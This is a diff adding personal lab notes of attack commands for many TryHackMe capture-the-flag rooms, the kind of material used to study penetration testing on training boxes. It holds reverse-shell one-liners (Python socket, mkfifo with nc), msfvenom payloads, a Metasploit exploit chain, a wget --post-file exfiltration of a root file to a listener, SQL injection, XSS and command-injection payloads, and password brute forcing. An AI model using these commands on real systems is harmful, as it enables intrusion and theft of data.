@@ -1,0 +1,1055 @@
+CTF collection Vol.2 : https://tryhackme.com/r/room/ctfcollectionvol2
+
+echo "10.10.53.15 ctfvol2.thm" >> /etc/hosts
+gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+nmap -sC -sV <ip>
+rustscan -a <ip> -- -sV
+gobuster dir -u <ip> -w directory-list-2.3-medium.txt -x php,html,txt
+gobuster dir -u <ip> -w /usr/share/wordlists/dirb/common.txt
+curl -s <ip> -D header.txt > aaa.txt
+curl -s --referer "tryhackme.com" <link>
+
+--> Check Robots.txt
+--> Change cookie sometime
+--> Change User agent
+
+--> Here we found Sqli. save resquest as a txt file name req.txt
+--> sqlmap -r request.txt --dbs --level 3 --risk 3
+--> sqlmap -r request.txt  --level 3 --risk 3 -D THM_f0und_m3 --tables
+--> sqlmap -r request.txt  --level 3 --risk 3 -D THM_f0und_m3 -T nothing_inside --columns
+--> sqlmap -r request.txt  --level 3 --risk 3 -D THM_f0und_m3 -T nothing_inside --dump-all
+
+curl -d "button1=button1&button2=button2&button3=button3" -X POST http://10.10.191.58/game2/
+curl -H "egg:Yes" http://10.10.191.58 
+curl -s -d "username=DesKel&password=heIsDumb" -X POST  http://10.10.207.251 
+
+Target > sitemap > script
+proxy > http history > script
+
+Madness : https://tryhackme.com/r/room/madness
+
+nmap -A -oN nmapscan <ip>
+wget http://10.10.92.6/thm.jpg
+nmap -nc -sV <ip>
+
+for i in $(seq 0 99);do echo $i >> id.txt;done
+ffuf -w id.txt:FUZZ -u <link>/secret=FUZZ
+ffuf -w id.txt:FUZZ -u <link>/secret=FUZZ -fs 408
+
+ssh user@<ip>
+ls -la
+find / -perm -u=s -type f 2>/dev/null
+https://gtfobins.github.io/
+searchsploit <name>
+
+--> check the source code
+
+Basic Pentesting : https://tryhackme.com/r/room/basicpentestingjt
+
+nmap -sV -O <ip>
+nmap <ip> -vv
+nmap -Pn -A -v <ip>
+nmap -sV -A <ip>
+nmp -sS -A -p- -T4 -oN nmap.txt <ip>
+nmap -sC -sV <ip> -oN nmap.txt
+gobuster dir --url <link> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+gobuster -u <ip>-w Discovery/Web-Content/directory-list-2.3-small.txt dir
+gobuster dir -u <ip> -w /usr/share/dirb/wordlists/common.txt
+dirb <ip>
+enum4linux <ip> -U
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<ip>
+hydra ssh://10.10.52.201 -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f
+ssh user@ip
+ls -la
+
+python3 /opt/john/ssh2john.py id_rsa.txt > decrypted.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt decrypted.txt
+
+Linux Strength Training : https://tryhackme.com/r/room/linuxstrengthtraining
+ 
+
+find [directory path] -type f -name [filename] >> find /home/Andy -type f -name sales.txt
+find [directory path] -type d -name [filename] >> find /home/Andy -type d -name pictures
+find [directory path] -type f -size [size] >> find /home/Andy -type f -size 10c
+find [directory path] -type f -user [username] >> find /etc/server -type f -user john
+find [directory path] -type f -group [group name] >> find /etc/server -type f -group teamstar
+find [directory path] -type f -newermt ‘[date and time]’ >> find / -type f -newermt '6/30/2020 0:00:00'
+find [directory path] -type f -newermt [start date range] ! -newermt [end date range] >> find / -type f -newermt 2013-09-12 ! -newermt 2013-09-14
+find [directory path] -type f -newerat [start date range] ! -newerat [end date range] >> find / -type f -newerat 2017-09-12 ! -newerat 2017-09-14
+grep -iRl [directory path/keyword] >> grep -iRl '/folderA/flag'
+
+john --format=raw-md5 --wordlist=rockyou.txt hash.txt
+hash-identifier <hash>
+cat hash.txt | hash -identifier
+john hash --wordlist=rockyou.txt --format=md4
+cat x.txt | base64 -d > new.txt
+
+gpg --cipher -algo AES-256 --symmetric secret.txt
+gpg secret.txt.gpg
+echo sam > data.txt 
+gpg --cipher -algo AES-256 --symmetric data.txt
+gpg2john secret.txt.gpg > hash
+john hash --wordlist=rockyou.txt --format=gpg
+
+UltraTech : https://tryhackme.com/r/room/ultratech1
+
+rustscan <ip> -b 1000 -r 0-65535 -t 5000 -- -A
+sudo nmap -p- -sS <ip> | tee open_ports
+sudo nmap -sV -sC -A -O -T4 -p21,22,8081,31331 <ip> | tee service_scan
+dirb <ip>     
+ffuf -u http://10.10.187.174:31337/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
+<ip>/js
+http://10.10.193.93:8081/ping?ip=10.10.193.93
+http://10.10.193.93:8081/ping?ip=10.10.193.93;ls
+http://10.10.193.93:8081/ping?ip=10.10.193.93|ls
+http://10.10.193.93:8081/ping?ip=10.10.193.93|`ls`
+
+TryHackMe 25 Days of Cyber Security : https://tryhackme.com/r/room/learncyberin25days
+
+--> Check The cookies
+
+--> Parameter and uploads
+https://www.thebestfestivalcompany.xyz/index.php?snack=mincePie
+https://www.thebestfestivalcompany.xyz/images/shell.jpg.php
+dirb <ip>
+
+--> reverse Shell
+/usr/share/webshells/php/php-reverse-shell.php
+cp /usr/share/webshells/php/php-reverse-shell.php .
+change ip and port
+sudo nc -lvnp 443
+try .jpeg, .jpeg.php, .jpeg.php.jpg, .jpg.php, .png.php, php.jpg, .php.png, php5
+if you see that listening that means it exploit
+
+--> Default Credentials 
+
+go to login page, give the random username and password. intercept with burpsuite and send to intruder and set the payload lists and use sniper or cluster bomb maybe use grep also some time use also url encoding etc.
+
+-->Fuzzing
+
+gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html
+wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt
+wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ
+sudo wfuzz -c -z file,/home/jasper/Downloads/wordlist -u http://10.10.18.178/api/site-log.php?date=FUZZ
+
+
+--> SQLI
+
+<?php $username = $_GET['username']; $result = mysql_query("SELECT * FROM users WHERE username='$username'"); ?>
+SELECT username,password FROM users WHERE username='$username' and password='$password' 
+SELECT username,password FROM users WHERE username='' or true -- and password='' 
+SELECT username,pass FROM users WHERE username=('$username') and password=('$password') 
+
+Source : https://www.codecademy.com/article/sql-commands
+https://github.com/payloadbox/sql-injection-payload-list
+
+
+--> XSS
+<img src='LINK' onmouseover="alert('xss')">   
+<https://somewebsite.com/titlepage?id=> <script> evilcode() </script> 
+10.10.100.27/reflected?keyword=
+10.10.100.27/reflected?keyword=<script>alert(1)</script>
+http://<ip>/?q=<value>
+
+payload:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+https://github.com/payloadbox/xss-payload-list
+
+
+-->Networking
+wireshark pcap1.pcap
+ip.src == 192.168.1.1
+ip.dst == 192.168.1.1
+tcp.port == 22 
+udp.port == 67
+http.request.method == GET / POST
+ip.addr == 192.168.1.1
+ip.addr != 192.168.1.10
+ip.addr == 192.168.1.1 && ip.addr == 192.168.1.10
+http.request.method == GET
+http.request.method == GET && ip.addr == 10.10.67.199
+
+Advent of Cyber 1 [2019] : https://tryhackme.com/r/room/25daysofchristmas
+
+--> Check Cookies
+--> gobuster dir -u http://10.10.218.103:3000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+--> hashcat -m 1800 buddy_hash.txt /usr/share/wordlists/rockyou.txt
+--> ssh mcsysadmin@10.10.89.60 >>>> pass
+--> grep -l -e "password" -f *
+--> cat * | grep -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+--> ls -la /home
+--> find / 2>>/dev/null | grep "shadow.bak"
+--> exiftool
+--> fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v christmaslists.zip
+--> steghide extract -sf TryHackMe.jpg
+--> nmap -sV -O 10.10.26.123
+--> nmap 10.10.68.225 -p 1-65535
+--> ssh holly@10.10.68.225 -p 65534 
+--> find / -user igor -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+--> find /home/igor/flag1.txt -exec cat '{}' \;
+--> find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+--> db_nmap -sV -A 10.10.223.120 >>>> msfconsole -q >>>> search struts2 >>>> use exploit/multi/http/struts2_content_type_ognl >>>> show options >>>> set RHOST 10.10.223.120 >>>> set RPORT 80 >>>> set TARGETURI /showcase.action >>>> search linux/x86/meterpreter/reverse_tcp >>>> set PAYLOAD payload/linux/x86/meterpreter/reverse_tcp >>>> show options >>>> set LHOST 10.9.35.106  >>>> exploit
+--> cd / && find / -iname *naughty* 2>/dev/null
+--> sed -n 148p /home/santa/naughty_list.txt 
+--> sed -n 52p /home/santa/nice_list.txt 
+--> sudo nmap -sS -sV -A 10.10.125.220
+--> ftp 10.10.125.220
+--> mysql -h 10.10.125.220 -u root -p
+--> gpg --decrypt note1.txt.gpg 
+--> sudo nmap -sS -sV -A -Pn 10.10.52.52
+--> nmap -Pn -sV 10.10.24.100
+--> gobuster dir -u http://10.10.52.52 -w directory-list-2.3-medium.txt 
+--> gobuster dir -u http://10.10.24.100 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+
+Link : https://www.aldeid.com/wiki/TryHackMe-Advent-of-Cyber
+
+
+
+All in One : https://tryhackme.com/r/room/allinonemj
+
+nmap -sC -sV -A -p- -oN nmap.txt <ip>
+ftp <ip>
+wpscan -url <ip> --enumerate u,ap
+wpscan --url http://10.10.244.196/wordpress/ -e u
+gobuster dir -u http://10.10.244.196 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+got to : tools > theme file editor > 404 template
+copy the shell : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+Change this :
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 8080;       // CHANGE THIS
+
+rlwrap nc -nlvp port
+rlwrap nc -lnvp port
+
+ls -la
+find / -user elyana -type f 2>/dev/null
+ssh user@ip >>> password
+cat /etc/crontab 
+
+Wordpress: CVE-2021-29447 : https://tryhackme.com/r/room/wordpresscve202129447
+
+wpscan — url <IP> -e p,t,u
+nmap -sC -sV -Pn <ip>
+wpscan --url <ip>
+gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+Blog : https://tryhackme.com/r/room/blog
+
+nano etc/host
+nmap -sSV <ip> -oN nmap.txt
+nmap -sC -sV -oA nmap.txt <ip>
+smbmap -H <ip>
+steghide
+ffuf -w /usr/share/wordlists/wfuzz/genaral/common.txt -u <link>/FUZZ
+wpscan --url <ip> -e u
+wpscan --url <ip> -U users.txt -P rockyou.txt
+
+Blue : https://tryhackme.com/r/room/blue
+
+nmap -sV -vv --script=vuln <ip>
+search <vulneravility name> type:exploit
+
+echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+C:/Windows/System32/config
+
+Blaster : https://tryhackme.com/r/room/blaster
+
+nmap -A -T4 -p- <IP>
+
+xfreerdp /u:username /p:password /v:ip
+we can use remote desktop protocol
+C:\Winndows\System32
+C:\Users\Administrator\Desktop
+gobuster dir --url <ip> -w /usr/share/wordlists/directory-list-2.3-small.txt 
+
+Fowsniff CTF : https://tryhackme.com/r/room/ctf
+
+nmap -A -p- -sV <ip>
+nmap -sV -vv <ip>
+nmap -Pn -A <ip>
+gobuster dir -u <ip> -w /usr/share/dirb/wordlists/common.txt
+hydra -L userfow.txt -P passfow.txt pop3://10.10.193.216
+hydra pop3://10.10.193.216 -L userfow.txt -P passfow.txt
+telnet 10.10.157.167 
+ssh stone@10.10.157.167
+find / -type f -group users 2>/dev/null
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Cicada-3301 Vol:1 : https://tryhackme.com/r/room/cicada3301vol1
+
+sonic visualyzer, steghide, outguess
+
+outguess -r 8S8OaQw.jpg name.txt
+https://qrscanneronline.com/
+
+Unstable Twin : https://tryhackme.com/r/room/unstabletwin
+
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.247.188 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -Pn -sC -sV -oA unstable 10.10.247.188
+sudo nmap 10.10.75.109
+sudo nmap -sV 10.10.75.109
+gobuster dir -u 10.10.75.109 -w /usr/share/wordlist/dirbuster/directory -list-1.0.txt
+echo "<box_ip>   twin.thm" >> /etc/hosts
+nmap -sV -sC twin.thm	
+rustscan -u 5000 -a 'machine-ip' -- -sC -sV
+gobuster dir -u http://twin.thm/ -w /usr/share/wordlists/common.txt
+gobuster dir -u <ip> -w /usr/share/dirb/wordlists/common.txt
+gobuster dir -u <ip>/api -w /usr/share/dirb/wordlists/big.txt
+curl http://unstable.thm/info -v
+curl -X POST http://unstable.thm/api
+ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://unstable.thm/FUZZ
+ffuf -mc all -fs 233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://unstable.thm/api/FUZZ
+curl -X POST http://unstable.thm/api/login
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin"
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin'"
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,sqlite_version()--"
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin'UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--"
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'users')--"
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,group_concat(password) from users--"
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,(select sql from sqlite_master where tbl_name = 'notes')--"
+curl -X POST 'http://unstable.thm/api/login' -d "username=admin&password=admin' UNION SELECT 1,notes FROM notes-- -"
+john hashes.txt --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt
+ssh mary_ann@unstable.thm
+ls -lsa
+ls -la
+curl http://unstable.thm/get_image?name=\julias --output julias.jpg
+
+curl -v http://'machine-ip'/info
+curl -X POST http://'machine-ip'/api/login
+curl -X POST http://'machine-ip'/api/login -d "username=' union select 1,sqlite_version()--&password=password"
+curl -X POST http://'machine-ip'/api/login -d "username=' UNION SELECT 1,tbl_name FROM sqlite_master -- -&password=password"
+curl -X POST http://'machine-ip'/api/login -d "username=' union select username,password FROM users; -- -&password=password"
+curl -X POST http://'machine-ip'/api/login -d "username=' UNION SELECT 1,notes FROM notes -- -&password=password"
+
+
+curl -X POST -d “username=admin’ OR 1=1 — &password=test” http://<IP>/api/login
+curl -X POST -d “username=admin’ UNION SELECT username,password FROM users — &password=test” http://<IP>/api/login
+curl -X POST -d “username=admin’ UNION select 1,tbl_name from sqlite_master— -&password=test” http://<IP>/api/login
+curl -X POST -d “username=admin’ UNION select 1,users from users— -&password=test” http://<IP>/api/login
+curl -X POST -d “username=admin’ UNION select 1,notes FROM notes— -&password=test” http://<IP>/api/login
+
+
+https://github.com/payloadbox/sql-injection-payload-list
+https://restfulapi.net/http-status-codes/
+https://pencer.io/ctf/ctf-thm-unstable/
+https://onlineblogzone.com/tryhackme-unstable-twin-writeup/
+https://medium.com/@nutthanon.tho/tryhackme-unstable-twin-85d8a2b97352
+
+--> curl -i <link>
+--> You can bruteforce directory list by burp 
+--> change GET/POST
+--> if you find <link>/api and 405 response that means you are closer try again bruteforce directory list <link>/api/FUZZ
+--> wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,400 <link>/api/FUZZ
+
+
+RootMe : https://tryhackme.com/r/room/rrootme
+
+nmap -sV <ip>
+gobuster dir -u <ip_addr> -w /root/Dekstop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+go to https://github.com/pentestmonkey/php-reverse-shell
+try those filetype : .php3, .php4, .php5, .php7, .pthml, .pht
+nc -lvnp <port>
+find / -type f -name user.txt 2> /dev/null
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+find / -type f -name root.txt
+find / -user root -perm /4000
+
+Linux Server Forensics : https://tryhackme.com/r/room/linuxserverforensics
+
+ssh user@ip >> password
+/var/log/apache2
+cat access.log | grep nmap | cut -d ‘“‘ -f 2 | 
+nmap <ip>
+grep “POST” access.log
+cat access.log | grep -i dirbus | grep -v 404 | cut -d ‘“‘ -f 2 | sort | uniq
+cat /etc/crontab
+/etc/passwd 
+/etc/shadow
+cat access.log | cut -d ‘“‘ -f 2 | sort | uniq
+cat access.log | grep -a GXWR
+sudo cat /root/.ssh/authorized_keys
+sudo head /root/.bash_history
+
+
+Memory Forensics : https://tryhackme.com/r/room/memoryforensics
+
+./volatility -f <file> imageinfo
+./volatility -f <file> --profile=Win7SP1x64 hashdump
+echo “aad3b435b51404eeaad3b435b51404ee:47fbd6536d7868c873d5ea455f2fc0c9” > john_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt john_hash.txt
+./volatility -f Snapshot19.vmem --profile=Win7SP1x64 shutdowntime
+./volatility -f Snapshot19.vmem --profile=Win7SP1x64 cmdscan
+./volatility -f Snapshot14.vmem --profile=Win7SP1x64 truecryptpassphrase
+
+Ignite : https://tryhackme.com/r/room/ignite
+
+nmap -A -v <ip>
+masscan -p- --rate 10000 <ip>
+gobuster dir -u http://10.10.175.67 -w /usr/share/wordlists/dirb/common.txt
+cat fuel/application/config/database.php
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+rlwrap nc -lvnp 4444
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+searchsploit fuel
+searchsploit -m php/webapps/50477.py
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Tunnel IP> 4444 >/tmp/f
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+echo "10.10.166.221 ignite.thm" >> /etc/hosts
+cd thm/ignite.thm
+ping -c 3 ignite.thm
+nmap --open -n -Pn -vvv -T4 ignite.thm
+nmap -p80 -sCV -T4 ignite.thm -oN port_scan
+searchsploit fuel cms 1.4 
+searchsploit -m 50477.py   
+python 50477.py -u http://ignite.thm
+     
+Wgel: https://tryhackme.com/r/room/wgelctf
+
+echo "10.10.22.231 wgel.thm" >> /etc/hosts
+sed -i '$ d' /etc/hosts
+ping -c 3 wgel.thm
+nmap --open -p0- -n -Pn -vvv --min-rate 5000 wgel.thm -oN nmap/port_scan
+nmap -p22,80 -n -Pn -vvv -sCV --min-rate 5000 wgel.thm -oN nmap/open_port
+gobuster dir -u wgel.thm -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u wgel.thm/sitemap -w /usr/share/wordlists/dirb/common.txt  
+ssh -i id_rsa jessie@wgel.thm
+sudo -l
+https://gtfobins.github.io/gtfobins/wget/
+sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
+nc -nvlp 4444
+find / -type f -iname "*flag.txt" 2>/dev/null
+
+
+Vulnversity:  https://tryhackme.com/r/room/vulnversity
+
+echo "10.10.39.96 vulnversity.thm" >> /etc/hosts
+sed -i '$ d' /etc/hosts
+ping -c 3 vulnversity.thm
+nmap --open -n -Pn -vvv vulnversity.thm
+nmap -p3128 -sV -sC -n -Pn -vvv vulnversity.thm 
+nmap -O -sV vulnversity.thm
+gobuster dir -u http://vulnversity.thm:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+Try : .php .php3 .php4 .php5 .phtml
+ls -la /home
+find / -perm -u=s -type f 2>/dev/null
+/bin/systemctl
+python -c 'import pty; pty.spawn("/bin/bash")'
+nc -nlvp <port>
+find / -user root -perm -4000 -exec ls -ldb {} \;
+sudo install -m =xs $(which systemctl) .
+
+-sV	      >> Attempts to determine the version of the services running
+-p <x> or -p- >> Port scan for port <x> or scan all ports
+-Pn	      >>  Disable host discovery and scan for open ports
+-A	      >> Enables OS and version detection, executes in-build scripts for further enumeration 
+-sC	      >> Scan with the default Nmap scripts
+-v	      >> Verbose mode
+-sU	      >> UDP port scan
+-sS	      >> TCP SYN port scan
+
+
+
+ffuf:
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -b "PHPSESSID=a4885a1d1802209109693054d94ae214; security=low" -u http://10.10.0.50/dvwa/FUZZ
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: 10.10.0.50" -u http://10.10.0.50/dvwa/FUZZ
+ffuf -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -X POST -d "username=admin\&password=FUZZ\&Login=Login" -u http://10.10.0.50/dvwa/login.php
+ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u http://10.10.0.50/dvwa/instructions.php?FUZZ=readme
+ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u http://10.10.0.50/dvwa/instructions.php?doc=FUZZ
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -mc 200
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -fc 403
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -fs 0
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -timeout 5
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -p 2
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -maxtime 60
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -t 60
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -s
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -o results.txt
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.0.50/dvwa/FUZZ -o results.txt -of html
+
+Link : https://null-byte.wonderhowto.com/how-to/fuzz-parameters-directories-more-with-ffuf-0330806/
+
+mc > target fc > ignore
+
+
+php reverse shell:
+
+got to : tools > theme file editor > 404 template
+copy the shell : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+Change this :
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 8080;       // CHANGE THIS
+
+rlwrap nc -nlvp port
+rlwrap nc -lnvp port
+
+for triggure : 127.0.0.1/wp-content/templatename/name.php
+127.0.1/wp-content/plugins/pluginname/name.php
+
+
+
+-- Nmap --
+
+nmap -sL <TARGETS>
+nmap -sL -n -oN Desktop/nmap1.txt 10.10.12.13/29
+nmap -sL -n -oN Desktop/namp2.txt 10.10.0-255.101-125
+sudo nmap -PR -sn 10.10.210.6/24
+sudo arp-scan 10.10.210.6/24
+sudo nmap -PE -sn 10.10.68.220/24
+sudo nmap -PP -sn 10.10.68.220/24
+sudo nmap -PM -sn 10.10.68.220/24
+sudo nmap -PS -sn 10.10.68.220/24
+sudo nmap -PA -sn 10.10.68.220/24
+sudo nmap -PU -sn 10.10.68.220/24
+
+sudo nmap -PS22,80,443 -sn <ip>/30
+sudo nmap -PA22,80,443 -sn <ip>/30
+sudo nmap -PU53,161,162 -sn <ip>/30
+
+masscan <ip>/24 -p443
+masscan <ip>/24 -p80,443
+masscan <ip>/24 -p22-25
+masscan <ip>/24 ‐‐top-ports 100
+
+https://www.calculator.net/ip-subnet-calculator.html
+
+nmap -sT <ip>
+nmap -sS <ip>
+nmap -sU <ip>
+nmap -sU -F -v <ip>
+
+nmap -sN <ip>
+nmap -sF <ip>
+nmap -sX <ip>
+nmap -sM <ip>
+nmap -sA <ip>
+nmap -sA <ip>
+nmap -sW <ip>
+nmap -sW <ip>
+nmap -sS <ip>
+nmap -sS --reason <ip>
+nmap -sS -vv <ip>
+
+nmap -S <spoofed_ip> <ip>
+nmap -e NET_INTERFACE -Pn -S <spoofed_ip> <machine_ip>
+nmap -D 10.10.0.1,10.10.0.2,ME <machine_ip>
+
+nmap -sV MACHINE_IP
+nmap -sV --version-light MACHINE_IP
+nmap -sS -O MACHINE_IP
+nmap -sS --traceroute MACHINE_IP
+
+cd /usr/share/nmap/scripts
+ls http*
+
+nmap -sS -sC MACHINE_IP
+nmap -sS -n --script "http-date" MACHINE_IP
+nmap -sC <ip>
+
+
+-- metasploit --
+
+--> go to opt/metasploit-framework/embedded/framework/modules
+tree -L 1 auxiliary/
+tree -L 1 encoders/
+tree -L 1 exploits/
+tree -L 2 evasion/
+tree -L 1 nops/
+tree -L 1 payloads/
+tree -L 1 post/
+
+
+nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP]
+
+msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
+Linux : msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+Windows : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+PHP : msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+ASP : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+Python : msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+
+meterpreter:
+getpid
+ps
+tasklist /m /fi "pid eq 1304"
+msfvenom --list payloads | grep meterpreter
+meterpreter supports : Android, IOS, JAVA, Linux, OSX, PHP, Python, Windows
+migrate 716
+hashdump
+search -f flag2.txt
+shell
+
+https://infosecwriteups.com/metasploit-meterpreter-tryhackme-simple-writeup-2023-1f8a787ba0a4
+https://systemweakness.com/metasploit-meterpreter-walkthrough-tryhackme-8bf76f7a5c6b
+
+-- Crypto --
+
+http://old.kali.org/kali-images/kali-2019.4/SHA1SUMS
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash1
+john --list=formats | grep -iF "whirlpool"
+john --list=formats | grep -iF "ntlm"
+john --single --format=raw-md5 hash7
+
+unshadow passwd shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
+
+zip2john secure.zip > ziphash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
+
+rar2john secure.rar > rarhash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt rarhash.txt
+
+python3 /opt/john/ssh2john.py id_rsa.id_rsa > hashedkey.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashedkey.txt
+
+
+-- Web Hacking --
+
+--> Check robots.txt
+--> curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+--> Check sitemap.xml
+--> curl <ip> -v
+--> site: inurl: filetype: intitle: 
+--> Wapplyzer, wayback, 
+
+--> crt.sh
+--> google, bing, yadex etc
+--> -site:www.tryhackme.com site:*.tryhackme.com
+--> dnsrecon -t brt -d <link>
+
+--> Username Enum
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}
+ffuf -w namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.186.57 -fs 2395
+
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
+
+--> Brute Force
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+
+ffuf -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=steve&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.200.105/customers/login -fc 200
+
+--> Logic Flaws
+curl ‘http://10.10.179.172/customers/reset?email=robert@acmeitsupport.thm' -H ‘Content-Type: application/x-www-form-urlencoded’ -d ‘username=robert&email={username}@customer.acmeitsupport.thm’
+
+curl 'http://10.10.200.105/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+
+curl 'http://10.10.200.105/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=user@customer.acmeitsupport.thm'
+
+--> Cookie Tampering
+curl http://MACHINE_IP/cookie-test
+curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
+curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+
+--> IDOR
+
+link/api/v1/customer?id=
+
+--> File Inclusion
+link/get.php?file-userCV.pdf
+
